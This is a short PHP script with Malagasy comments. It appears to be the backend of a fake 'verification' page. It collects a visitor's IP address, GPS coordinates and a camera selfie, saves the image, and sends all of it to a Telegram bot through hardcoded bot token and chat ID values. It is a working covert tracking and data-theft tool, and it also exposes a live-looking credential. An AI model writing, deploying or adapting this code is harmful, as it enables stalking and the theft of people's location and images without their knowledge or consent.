<?php
$data = json_decode(file_get_contents("php://input"), true);

// IP an'ny olona
$ip = $_SERVER['REMOTE_ADDR'];

// Maka GPS
$latitude = isset($data['latitude']) ? $data['latitude'] : 'unknown';
$longitude = isset($data['longitude']) ? $data['longitude'] : 'unknown';

// Maka selfie
$selfieFile = "";
if(isset($data['image'])){
    $img = str_replace('data:image/png;base64,', '', $data['image']);
    $img = base64_decode($img);
    $selfieFile = 'selfie_'.time().'.png';
    file_put_contents($selfieFile, $img);
}

// Token sy Chat ID
$token = "8277743126:AAH0VRKfw7Q9bm3vsg-sX9-K3NNkoLIKWZY";
$chat_id = "7455668049";

// Hafatra misy Google Maps link
$message = "✅ Nouvelle vérification\n".
           "IP: $ip\n".
           "Latitude: $latitude\n".
           "Longitude: $longitude\n".
           "📍 Map: https://www.google.com/maps?q=$latitude,$longitude";

// Alefa amin'ny Telegram ny hafatra
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=".urlencode($message));

// Raha misy selfie dia alefa koa
if($selfieFile){
    $url = "https://api.telegram.org/bot$token/sendPhoto";
    $post_fields = [
        'chat_id' => $chat_id,
        'photo' => new CURLFile($selfieFile)
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    $result = curl_exec($ch);
    curl_close($ch);
}
?>